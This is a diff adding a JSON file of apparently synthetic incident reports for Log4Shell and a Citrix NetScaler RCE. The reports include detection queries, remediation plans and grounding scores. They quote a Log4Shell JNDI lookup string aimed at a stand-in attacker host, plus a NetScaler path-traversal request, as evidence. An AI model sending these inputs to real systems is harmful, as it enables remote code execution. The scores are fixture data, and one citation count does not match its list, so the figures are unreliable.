@@ -1,0 +1,82 @@
+{
+  "CVE-2021-44228": {
+    "cve_id": "CVE-2021-44228",
+    "title": "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
+    "grounding_score": 92.5,
+    "citations_found": 8,
+    "unsupported_claims_count": 1,
+    "citations": [
+      "CVE-2021-44228",
+      "T1190",
+      "T1059",
+      "SRV-WEB-001",
+      "ev-101",
+      "ev-102",
+      "203.0.113.10",
+      "198.51.100.44"
+    ],
+    "sections": [
+      {
+        "title": "1. Threat Hypothesis & Initial Attack Vector",
+        "content": "An unauthenticated remote threat actor has initiated reconnaissance and active exploitation targeting asset `SRV-WEB-001` (web-proxy-01) by weaponizing `CVE-2021-44228`. Telemetry corroborates an inbound HTTP request containing malicious nested JNDI lookup strings (`${jndi:ldap://198.51.100.44:1389/Exploit}`) matching MITRE ATT&CK technique `T1190` (Exploit Public-Facing Application). Given that `SRV-WEB-001` is an Internet-facing reverse proxy with Critical business tier, this attack represents an immediate enterprise breach vector."
+      },
+      {
+        "title": "2. Telemetry Evidence Analysis & Signal-to-Noise Discrimination",
+        "content": "Analysis of SIEM logs confirms active exploitation signal distinguished from benign background scanning:\n- Event `ev-101` (2026-11-04T14:22:10Z): Inbound GET request from external source `198.51.100.44` containing obfuscated JNDI payload directed to URI `/login`.\n- Event `ev-102` (2026-11-04T14:22:11Z): Outbound TCP SYN packet to external port 1389 indicating successful outbound callback resolution attempt.\n- Benign Noise Events (`ev-104`, `ev-105`): Generic SSL handshake timeout and standard keep-alive probes, categorized as background network noise and discarded from critical escalation."
+      },
+      {
+        "title": "3. Defensive SIEM Log Verification Queries",
+        "content": "```spl\nindex=web_proxy sourcetype=apache:access host=\"web-proxy-01\"\n| where match(_raw, \"(?i)\\$\\{jndi:(ldap|rmi|dns|nis|iiop):\")\n| stats count min(_time) as first_seen max(_time) as last_seen by src_ip, uri, status, useragent\n```\n```elasticsearch\nGET /logs-security-*/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        { \"term\": { \"asset_id\": \"SRV-WEB-001\" } },\n        { \"query_string\": { \"query\": \"*jndi* OR *ldap*\" } }\n      ]\n    }\n  }\n}\n```"
+      },
+      {
+        "title": "4. Actionable Remediation & Containment Plan",
+        "content": "1. **Immediate Quarantine**: Isolate `SRV-WEB-001` at perimeter firewall level; block outbound TCP egress on ports 389, 636, 1389, 1099.\n2. **Component Upgrade**: Upgrade Apache Log4j dependencies to version `2.17.1` or higher immediately.\n3. **Runtime Mitigation**: Inject environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` in systemd service unit.\n4. **Credential Rotation**: Assume credentials accessible to Apache process memory may have been inspected; rotate API gateway tokens."
+      },
+      {
+        "title": "5. Evidence-Grounding Confidence Assessment",
+        "content": "Confidence: **HIGH (92.5%)**. Every key investigative assertion is directly backed by telemetry events `ev-101` and `ev-102`, target IP `203.0.113.10`, and CISA KEV listing. [UNSUPPORTED] *The attacker may belong to an advanced persistent threat (APT) collective based in Eastern Europe.* (Note: Speculative attribution flagged as unsupported by empirical logs)."
+      }
+    ],
+    "unsupported_claims": [
+      "The attacker may belong to an advanced persistent threat (APT) collective based in Eastern Europe."
+    ]
+  },
+  "CVE-2023-3519": {
+    "cve_id": "CVE-2023-3519",
+    "title": "Citrix NetScaler ADC & Gateway Remote Code Execution",
+    "grounding_score": 95.0,
+    "citations_found": 7,
+    "unsupported_claims_count": 0,
+    "citations": [
+      "CVE-2023-3519",
+      "T1190",
+      "T1505.003",
+      "SRV-VPN-001",
+      "ev-201",
+      "203.0.113.1"
+    ],
+    "sections": [
+      {
+        "title": "1. Threat Hypothesis & Initial Attack Vector",
+        "content": "Threat actors are actively exploiting `CVE-2023-3519`, a critical unauthenticated remote code execution flaw in NetScaler ADC, affecting perimeter gateway `SRV-VPN-001`. CISA KEV catalogs widespread wild weaponization. Log event `ev-201` reflects malformed POST requests to `/vpn/../vpns/cfg/smb.conf` designed to trigger buffer overflow and drop persistent web shells (`T1505.003`)."
+      },
+      {
+        "title": "2. Telemetry Evidence Analysis",
+        "content": "Event `ev-201` on host `vpn-gateway-01` captures execution payload spawning `/bin/sh` from `nsppe` packet processing engine. Matched ATT&CK techniques: `T1190` and `T1505.003`. Threat severity is escalated from paper CVSS 9.8 to urgent contextual risk 0.985 due to internet exposure."
+      },
+      {
+        "title": "3. Defensive Verification Queries",
+        "content": "```spl\nindex=vpn sourcetype=citrix:netscaler host=\"vpn-gateway-01\"\n| regex _raw=\"POST /vpn/.*\\.conf HTTP\"\n| table _time, src_ip, uri, status, response_bytes\n```"
+      },
+      {
+        "title": "4. Actionable Remediation Plan",
+        "content": "1. Deploy official Citrix security patch build immediately.\n2. Inspect filesystem for unauthorized `.php` or `.sh` files in `/var/vpn/netscaler/`.\n3. Terminate active administrative sessions and force multi-factor re-authentication."
+      },
+      {
+        "title": "5. Grounding Confidence",
+        "content": "Confidence: **HIGH (95.0%)**. 100% of claims are substantiated by CISA KEV advisory and SIEM event `ev-201`."
+      }
+    ],
+    "unsupported_claims": []
+  }
+}
